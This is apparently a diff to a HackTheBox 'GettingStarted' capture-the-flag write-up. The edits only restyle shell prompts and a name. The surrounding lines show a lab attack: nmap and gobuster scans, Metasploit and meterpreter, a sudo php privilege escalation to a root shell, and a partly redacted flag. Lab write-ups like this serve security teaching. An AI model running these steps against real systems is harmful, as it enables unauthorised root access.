@@ -112,7 +112,7 @@ window.onload = wrap_img;
 <a class="anchor" href="#nmap-scan" aria-hidden="true"><span class="octicon octicon-link"></span></a>nmap scan</h2>
 <p>Machine IP: 10.129.42.249</p>
 
-<p><code class="language-plaintext highlighter-rouge">&gt; sudo nmap -sV -sC -O 10.129.42.249</code></p>
+<p><code class="language-plaintext highlighter-rouge">$ sudo nmap -sV -sC -O 10.129.42.249</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-06-10 10:46 PDT
 Nmap scan report <span class="k">for </span>10.129.42.249
@@ -164,7 +164,7 @@ It’s important to look at things like comments (shown in green) in the html so
 <p>While we read the source code, we can run a <strong>Gobuster</strong> scan to look for potential directories on the web server.</p>
 <h2 id="gobuster-scan">
 <a class="anchor" href="#gobuster-scan" aria-hidden="true"><span class="octicon octicon-link"></span></a>Gobuster Scan</h2>
-<p><code class="language-plaintext highlighter-rouge">&gt; gobuster -u 10.129.42.249 dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3- medium.txt -t50
+<p><code class="language-plaintext highlighter-rouge">$ gobuster -u 10.129.42.249 dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3- medium.txt -t50
 </code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">=============================================================</span>
 Gobuster v3.1.0
@@ -242,7 +242,7 @@ Bingo! It looks like we are met with some great information: the running service
 
 <p>Let’s open our metasploit console.</p>
 
-<p><code class="language-plaintext highlighter-rouge">&gt; msfconsole</code></p>
+<p><code class="language-plaintext highlighter-rouge">$ msfconsole</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To use retry middleware with Faraday v2.0+, <span class="nb">install</span> <span class="sb">`</span>faraday-retry<span class="sb">`</span> gem
                                                   
@@ -444,7 +444,7 @@ meterpreter <span class="o">&gt;</span>
 
 <p>Now, let’s run the following commands to check what <code class="language-plaintext highlighter-rouge">sudo</code> privileges we have.</p>
 
-<p>` &gt; sudo -l`</p>
+<p>` $ sudo -l`</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries <span class="k">for </span>www-data on gettingstarted:                                                                                             
     env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin                                 
@@ -461,21 +461,21 @@ User www-data may run the following commands on gettingstarted:
 </code></pre></div></div>
 <p>To avoid any complications with declaring environmental variables, we’ll use the following command as a substitute.</p>
 
-<p><code class="language-plaintext highlighter-rouge">&gt; sudo php -r "system('/bin/sh');"</code></p>
+<p><code class="language-plaintext highlighter-rouge">$ sudo php -r "system('/bin/sh');"</code></p>
 
 <p>So let’s test if we escalated privileges with a simple <code class="language-plaintext highlighter-rouge">whoami</code> query.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">whoami
-</span>root
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># whoami</span>
+root
 </code></pre></div></div>
 <p>Voila! We are now <strong>root</strong>. Let’s run the <code class="language-plaintext highlighter-rouge">find</code> command we used earlier to find the contents of the <strong>root.txt</strong> file.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> find / <span class="nt">-iname</span> root.txt 2&gt;/dev/null
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># find / -iname root.txt 2&gt;/dev/null</span>
 /root/root.txt
-<span class="o">&gt;</span> <span class="nb">cd</span> /root
-<span class="o">&gt;</span> <span class="nb">ls
-</span>root.txt
-<span class="o">&gt;</span> <span class="nb">cat </span>root.txt
+<span class="c"># cd /root</span>
+<span class="c"># ls</span>
+root.txt
+<span class="c"># cat root.txt</span>
 f1fba6e9f71efb26[...]
 </code></pre></div></div>
 <p>Congratulations, the final flag is <code class="language-plaintext highlighter-rouge">f1fba6e9f71efb26[...]</code>. You have officially completed the module!</p>
@@ -485,7 +485,7 @@ f1fba6e9f71efb26[...]
 
 <p><strong>Have fun and happy hacking!</strong></p>
 
-<p><em>Special Thanks to <a href="https://koi0x.github.io/Research/">Koi</a>, <a href="https://ser3n1ty.com/">ser3nity</a>, and leo.</em></p>
+<p><em>Special Thanks to <a href="https://koi0x.github.io/Research/">Koi</a>, <a href="https://ser3n1ty.com/">ser3nity</a>, and Leo.</em></p>
 
   </div><a class="u-url" href="/CTF-Writeups-and-Blogs/ctf/hackthebox/2022/06/10/GettingStarted.html" hidden></a>
 </article>
